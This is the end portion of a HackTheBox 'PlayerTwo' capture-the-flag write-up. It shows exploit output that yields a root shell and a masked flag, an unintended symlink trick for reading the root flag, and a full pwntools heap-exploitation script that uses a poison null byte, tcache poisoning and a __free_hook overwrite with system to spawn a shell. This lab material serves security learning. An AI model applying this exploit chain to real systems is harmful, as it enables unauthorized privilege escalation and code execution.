<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span> <span class="n">python3</span> <span class="n">final_exploit</span><span class="p">.</span><span class="n">py</span> 
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="s">'/home/kali/HTB/boxes/player2/binary_2/libc.so.6'</span>
    <span class="n">Arch</span><span class="p">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
    <span class="n">RELRO</span><span class="p">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
    <span class="n">Stack</span><span class="p">:</span>    <span class="n">Canary</span> <span class="n">found</span>
    <span class="n">NX</span><span class="p">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
    <span class="n">PIE</span><span class="p">:</span>      <span class="n">PIE</span> <span class="n">enabled</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Connecting</span> <span class="n">to</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.170</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">22</span><span class="p">:</span> <span class="n">Done</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">observer</span><span class="o">@</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">10.170</span><span class="p">:</span>
    <span class="n">Distro</span>    <span class="n">Ubuntu</span> <span class="mf">18.04</span>
    <span class="n">OS</span><span class="p">:</span>       <span class="n">linux</span>
    <span class="n">Arch</span><span class="p">:</span>     <span class="n">amd64</span>
    <span class="n">Version</span><span class="p">:</span>  <span class="mf">5.2</span><span class="p">.</span><span class="mi">5</span>
    <span class="n">ASLR</span><span class="p">:</span>     <span class="n">Enabled</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">remote</span> <span class="n">process</span> <span class="s">b'/opt/Configuration_Utility/Protobs'</span> <span class="n">on</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.170</span><span class="p">:</span> <span class="n">pid</span> <span class="mi">37068</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Main</span> <span class="n">arena</span> <span class="n">leak</span>  <span class="p">:</span> <span class="mh">0x7f31c4f37ca0</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Libc</span> <span class="n">base</span> <span class="n">address</span><span class="p">:</span> <span class="mh">0x7f31c4d53000</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Free</span> <span class="n">hook</span> <span class="n">address</span><span class="p">:</span> <span class="mh">0x7f31c4f3a5a8</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">System</span> <span class="n">address</span>   <span class="p">:</span> <span class="mh">0x7f31c4da5fd0</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
<span class="c1"># $ whoami &amp;&amp; id &amp;&amp; hostname
</span><span class="n">root</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">observer</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">observer</span><span class="p">)</span> <span class="n">euid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">observer</span><span class="p">)</span>
<span class="n">player2</span>
<span class="c1"># $ cat /root/root.txt
</span><span class="mi">73</span><span class="n">DA</span><span class="o">***********************</span><span class="mi">7</span><span class="n">D8C5</span> 
</code></pre></div></div>

<h1 id="appendix"><a name="Appendix"></a>Appendix</h1>
<h2 id="root---unintended">Root - unintended</h2>
<p class="text-justify">The trivial way of becoming root is to realize that for the ssh key to be sent via MQTT the ssh key from observers home directory is read. Feels like this was on purpose as this could have easily been fixed. Thus replacing the private key file with a symbolic link to <code class="language-plaintext highlighter-rouge">/root/root.txt</code> will get you the flag.</p>
<h2 id="root---another-intended-way">Root - another intended way</h2>
<p>Disclaimer: The following is not my work but I have the permission to publish.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>

<span class="nb">bin</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./Protobs'</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc.so.6'</span><span class="p">)</span>

<span class="k">if</span><span class="p">(</span><span class="n">LOCAL</span><span class="p">):</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./Protobs"</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">remoteShell</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="n">host</span> <span class="o">=</span> <span class="s">"player2.htb"</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="s">"observer"</span><span class="p">,</span> <span class="n">keyfile</span><span class="o">=</span><span class="s">"id_rsa"</span><span class="p">)</span>
    <span class="n">remoteShell</span><span class="p">.</span><span class="n">set_working_directory</span><span class="p">(</span><span class="s">"/opt/Configuration_Utility"</span><span class="p">)</span>
    <span class="n">p</span> <span class="o">=</span><span class="n">remoteShell</span><span class="p">.</span><span class="n">process</span><span class="p">(</span><span class="s">"./Protobs"</span><span class="p">)</span>


<span class="c1"># Begin Function helpers
</span><span class="k">def</span> <span class="nf">wait</span><span class="p">():</span>
    <span class="n">p</span><span class="p">.</span><span class="n">recvrepeat</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">desc</span><span class="p">,</span> <span class="n">game</span><span class="o">=</span><span class="s">''</span><span class="p">,</span> <span class="n">contrast</span> <span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="n">gamma</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="n">xres</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="n">yres</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="n">controller</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'2'</span><span class="p">)</span>
    <span class="n">wait</span><span class="p">()</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">game</span><span class="p">)</span>
    <span class="n">wait</span><span class="p">()</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">contrast</span><span class="p">))</span>
    <span class="n">wait</span><span class="p">()</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">gamma</span><span class="p">))</span>
    <span class="n">wait</span><span class="p">()</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">xres</span><span class="p">))</span>
    <span class="n">wait</span><span class="p">()</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">yres</span><span class="p">))</span>
    <span class="n">wait</span><span class="p">()</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">controller</span><span class="p">))</span>
    <span class="n">wait</span><span class="p">()</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">wait</span><span class="p">()</span>
    <span class="k">if</span> <span class="n">size</span> <span class="ow">is</span> <span class="ow">not</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">desc</span><span class="p">)</span>
        <span class="n">wait</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'4'</span><span class="p">)</span>
    <span class="n">wait</span><span class="p">()</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
    <span class="n">wait</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'3'</span><span class="p">)</span>
    <span class="n">wait</span><span class="p">()</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>

<span class="c1"># End Function helpers 
</span><span class="n">small</span> <span class="o">=</span> <span class="mh">0x198</span>
<span class="n">big</span> <span class="o">=</span> <span class="mh">0x4f0</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvrepeat</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">wait</span><span class="p">()</span>
<span class="c1"># fill with 6 tcache bins
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">,</span> <span class="nb">chr</span><span class="p">(</span><span class="mi">65</span><span class="o">+</span><span class="n">i</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x20</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
    <span class="n">free</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="c1"># 6 chunks in tcache
</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">' '</span><span class="p">)</span>
<span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># 5 chunks in tcache
</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'[ Description         ]: '</span><span class="p">)</span> 
<span class="n">heapleak</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
<span class="n">heapleak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">heapleak</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'heap leak: '</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">heapleak</span><span class="p">))</span>

<span class="n">alloc</span><span class="p">(</span><span class="mh">0x500</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x30</span><span class="p">)</span> <span class="c1"># 4 chunk in tcache
</span><span class="n">alloc</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x30</span><span class="p">)</span> <span class="c1"># 3 chunk in tcache, chunk index 2
</span><span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># Prevent top consolidation, back to 4 chunks in tcache
</span><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># for libc leaking, 5 chunks in tcache
</span><span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s">' '</span><span class="p">)</span> <span class="c1"># 4 chunk in tcache, chunk 1
</span><span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># 1 is taken up
</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'[ Description         ]: '</span><span class="p">)</span> 
<span class="n">libcleak</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
<span class="n">libcleak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">libcleak</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libcleak</span> <span class="o">-</span> <span class="mh">0x1e4c40</span> <span class="o">-</span> <span class="mi">96</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"libc base: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span>

<span class="c1"># Fill the rest of the tcache
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mh">0x20</span><span class="p">)</span> <span class="c1">#2,3,4,5
</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">''</span><span class="p">)</span> <span class="c1"># 6,7,8
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">10</span><span class="p">):</span>
    <span class="n">free</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
<span class="c1"># 7 chunks in 0x40 tcache
# tcache should be filled up now
</span>
<span class="c1"># Now its time for the poison null byte. just remember what i said before and you should be fine.
# there is however one thing to note and its the size i chose to overwrite.
# i allocated 0x4f0 for it so it becomes 0x500. not only do i not have to fill tcachebin for it before it does the coalesce/unsorted mechanism
# but when i overwrite it, it will become 0x501(prev in use is on) to 0x500. this way i wont have to deal with the libc check
# that checks the chunks afterwards as the size did not actually change. also you will need to slowly write the poison null byte by writing backwards byte by byte
# due to the way it transfers the data from the buffer to the eap in the allocation function.
# you will also need to make sure you have a freed chunk in that coalesced regioon to create a heap overlap afterwards.
</span>
<span class="c1"># time for the poison null byte
</span><span class="n">alloc</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span> <span class="s">'C'</span><span class="o">*</span><span class="mh">0x38</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">heapleak</span><span class="o">+</span><span class="mh">0xa50</span><span class="p">))</span> <span class="c1"># 2
</span>
<span class="c1"># wipe out null bytes to set up forged chunck correctly
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
    <span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span> <span class="s">'C'</span><span class="o">*</span><span class="p">(</span><span class="mh">0x38</span><span class="o">-</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span>
<span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1">#continue setting up forged chunk
</span><span class="n">alloc</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span> <span class="s">'C'</span><span class="o">*</span><span class="mh">0x30</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">heapleak</span><span class="o">+</span><span class="mh">0xa50</span><span class="p">))</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
    <span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span> <span class="s">'C'</span><span class="o">*</span><span class="p">(</span><span class="mh">0x30</span><span class="o">-</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span>
<span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span> <span class="s">'C'</span><span class="o">*</span><span class="mh">0x28</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">small</span><span class="o">+</span><span class="mh">0x38</span><span class="p">))</span> <span class="c1">#2
# forged chunk should be good to go
</span>
<span class="n">alloc</span><span class="p">(</span><span class="n">small</span><span class="p">,</span> <span class="s">'D'</span> <span class="o">*</span> <span class="mi">100</span><span class="p">)</span> <span class="c1">#3
</span><span class="n">alloc</span><span class="p">(</span><span class="n">big</span><span class="p">,</span> <span class="s">'E'</span><span class="o">*</span><span class="mh">0x100</span><span class="p">)</span> <span class="c1">#4
</span><span class="n">alloc</span><span class="p">(</span><span class="mh">0x210</span><span class="p">,</span> <span class="s">''</span><span class="p">)</span> <span class="c1">#Prevent top consolidation #5
</span><span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="n">small</span><span class="p">,</span> <span class="s">'F'</span><span class="o">*</span><span class="p">(</span><span class="n">small</span><span class="p">))</span> <span class="c1"># poison null byte
</span>
<span class="c1">#setup fake prev size
</span><span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
    <span class="n">alloc</span><span class="p">(</span><span class="n">small</span><span class="p">,</span> <span class="s">'F'</span><span class="o">*</span><span class="p">(</span><span class="n">small</span><span class="o">-</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span>
    <span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="n">small</span><span class="p">,</span> <span class="s">'F'</span><span class="o">*</span><span class="p">(</span><span class="n">small</span><span class="o">-</span><span class="mh">0x8</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">small</span><span class="o">+</span><span class="mh">0x38</span><span class="p">))</span>
<span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="c1">#chunk coalesced now
</span>
<span class="c1"># now you have coalesced region with a free chunk pointing to the same region, thereby creating a heap overlap. technically tcache poison by overwriting the fd pointer is very trivial. but beware the
# tcache count check. this can be handled by allocating several tcachebins of the same size and then putting them all in the respective tcache bins, so when you poison the tcache bins, you will have enough
# for tcache counts to not worry about it becoming -1 and thus not giving the target region back. then overwrite free hook with system and pop a shell with a string since you control the rdi value for free.
</span>
<span class="n">alloc</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span> <span class="s">'temp'</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span> <span class="s">'ZZZZ'</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="s">'Y'</span><span class="o">*</span><span class="mh">0x20</span><span class="p">)</span> <span class="c1"># 6
</span><span class="n">alloc</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="s">'Y'</span><span class="o">*</span><span class="mh">0x20</span><span class="p">)</span> <span class="c1"># so tcache count doesnt drop, bypass that check
</span><span class="n">alloc</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="s">'Y'</span><span class="o">*</span><span class="mh">0x20</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="n">small</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="p">(</span><span class="mh">0x60</span><span class="o">+</span><span class="mh">0x70</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__free_hook'</span><span class="p">]))</span> <span class="c1"># overlapped chunks
</span><span class="n">alloc</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="s">''</span><span class="p">)</span>
<span class="c1"># above was a tcache poison, now overwrite malloc hook
</span><span class="n">alloc</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]))</span> <span class="c1"># 8, because it frees the desc first, we cant have it do that
</span><span class="n">alloc</span><span class="p">(</span><span class="mh">0x300</span><span class="p">,</span> <span class="s">''</span><span class="p">,</span> <span class="n">game</span><span class="o">=</span><span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="c1"># 9
</span><span class="n">free</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>
<span class="c1"># now we have an interactive shell
</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span>
</code></pre></div></div>

<h1 id="references">References</h1>
<p><a name="[0]">[0]</a> <a href="https://twitchtv.github.io/twirp/docs/intro.html">Twirp documentation</a></p>

<p><a name="[1]">[1]</a> <a href="https://faraz.faith/2019-10-12-picoctf-2019-heap-challs/">Write-ups which are useful for the box</a></p>

<p><a name="[2]">[2]</a> <a href="https://www.nullbyte.cat/post/babyheap-def-con-ctf-qualifier-2019/">Another source of useful write-ups</a></p>

<p><a name="[3]">[3]</a> <a href="https://www.youtube.com/watch?v=43ewpRBIRgA">RCE via tcache poisoning</a></p>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#binary-exploitation" class="page__taxonomy-item" rel="tag">binary exploitation</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#heap" class="page__taxonomy-item" rel="tag">heap</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">linux</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#boxes" class="page__taxonomy-item" rel="tag">boxes</a>
    
    </span>
  </p>


        
  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-06-26T21:33:36-04:00">June 26, 2020</time></p>


      </footer>

      <section class="page__share">
  
    <h4 class="page__share-title">Share on</h4>
  

  <a href="https://twitter.com/intent/tweet?text=Write-up%3A+HackTheBox+-+PlayerTwo%20http%3A%2F%2Flocalhost%3A4000%2Fboxes%2Fplayer2%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>

  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fboxes%2Fplayer2%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>

  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fboxes%2Fplayer2%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
</section>


      
  <nav class="pagination">
    
      <a href="/boxes/ServMon/" class="pagination--pager" title="Write-up: HackThebox - ServMon
">Previous</a>
    
    
      <a href="/boxes/travel/" class="pagination--pager" title="Write-up: HackTheBox - Travel
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
    <div class="page__related">
      <h4 class="page__related-title">You may also enjoy</h4>
      <div class="grid__wrapper">
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/boxes/Time/" rel="permalink">Write-up: HackTheBox - Time
</a>
      
    </h2>
    
      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  5 minute read

</p>
    
    <p class="archive__item-excerpt" itemprop="description">Medium rated box, being more on the easier side of it that involves exploiting a CVE to get a shell and editing a script that is run as root for priv esc.
</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/challenges/RopMe/" rel="permalink">Write-up: HackThebox - RopMe
</a>
      
    </h2>
    
      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  6 minute read

</p>
    
    <p class="archive__item-excerpt" itemprop="description">A challenge to practice return-oriented programming.
</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/boxes/travel/" rel="permalink">Write-up: HackTheBox - Travel
</a>
      
    </h2>
    
      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  9 minute read

</p>
    
    <p class="archive__item-excerpt" itemprop="description">Cool box with little guessing and much to learn.
</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/boxes/ServMon/" rel="permalink">Write-up: HackThebox - ServMon
</a>
      
    </h2>
    
      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  5 minute read

</p>
    
    <p class="archive__item-excerpt" itemprop="description">Write-up of the box ServMon from Hack The Box
</p>
  </article>
</div>

        
      </div>
    </div>
  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    
      <li><strong>Follow:</strong></li>
    

    
      
        
      
        
      
        
      
        
      
        
      
        
      
    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2021 Philipp Menner. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>









  </body>
</html>
